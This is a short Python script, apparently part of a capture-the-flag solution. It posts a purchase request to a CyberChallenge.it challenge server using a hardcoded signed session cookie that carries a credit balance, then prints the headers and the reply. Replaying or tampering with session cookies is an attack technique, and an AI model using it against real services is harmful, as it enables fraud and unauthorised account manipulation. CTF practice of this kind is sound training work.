import requests


s = requests.Session()
url = 'http://yasc.challs.cyberchallenge.it/buy'

data = {"product_id":"43d27d66-150b-4b41-a1ee-6c3e02c0a67c"}

r = s.post(url, cookies={"session" : 'eyJjcmVkaXQiOjU4LjB9.ahG-Ng.H2vm1bdnduVY_l1WwddxrLfFXVE'},  data=data)
print(r.request.headers)
print(r.text)